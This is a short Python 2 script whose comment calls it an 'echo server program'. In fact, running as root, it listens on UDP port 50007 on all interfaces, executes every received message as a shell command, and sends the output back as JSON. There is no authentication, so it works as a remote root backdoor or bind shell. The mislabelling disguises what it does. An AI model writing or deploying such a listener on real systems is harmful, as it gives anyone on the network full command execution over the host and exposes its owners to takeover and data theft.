#!/usr/bin/env python
#-*- coding: utf-8 -*-


# Echo server program
import socket
import commands
import json
import os
def main():
    if os.getuid() != 0:
        print "I want authority of root"
        return
    HOST = ''                 # Symbolic name meaning all available interfaces
    PORT = 50007              # Arbitrary non-privileged port
    conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    conn.bind((HOST, PORT))
    ans = {}
    while 1:
        string, address = conn.recvfrom(1024)
        if string:
            ans['status'], ans['results'] = commands.getstatusoutput(string)
            conn.sendto(json.dumps(ans), address)
    conn.close()
# if __name__ == '__main__':
main()